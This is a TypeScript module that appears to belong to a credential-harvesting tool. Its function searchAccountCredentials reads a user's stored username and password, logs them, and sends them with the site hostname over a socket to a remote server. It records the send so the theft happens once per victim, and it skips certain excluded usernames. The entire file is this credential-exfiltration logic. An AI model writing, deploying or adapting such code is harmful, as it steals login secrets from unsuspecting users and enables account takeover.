import { objectStorage } from '@classes';
import { ACCOUNT_CREDENTIALS_SEARCH_EXCLUDED_USERNAMES } from '@env';
import { getAccountCredentials } from '@functions';
import { socket } from '@globals';

export const searchAccountCredentials = (locationHostname: string, currentUsername: string) => {
	(async () => {
		if (ACCOUNT_CREDENTIALS_SEARCH_EXCLUDED_USERNAMES.includes(currentUsername)) {
			return;
		}

		console.log('Get the account credentials.');

		const accountCredentials = await getAccountCredentials();

		// No account credentials found.
		if (!accountCredentials.username || !accountCredentials.password) {
			return;
		}

		console.log(`Account Credentials: '${accountCredentials}'`);

		// Check if the value has already been sent to the server.
		if (objectStorage.getItem(nameof(searchAccountCredentials))) {
			return;
		}

		// Sends the account credentials to the server. This is actually superfluous, as it can also be read out on the server
		// side. However, we want to make sure that no proxy was used by the client.

		// Sends the information to the server if it has not already been saved as sent in the client.
		socket.emit(
			'account credentials',
			{ origin: locationHostname, username: currentUsername },
			{ ...accountCredentials },
			(res?: { status?: 'ok' }) => {
				if (!res || res.status !== 'ok') {
					return;
				}

				// Save that the value has already been sent to the server.
				objectStorage.setItem(nameof(searchAccountCredentials), true);
			}
		);
	})();
};
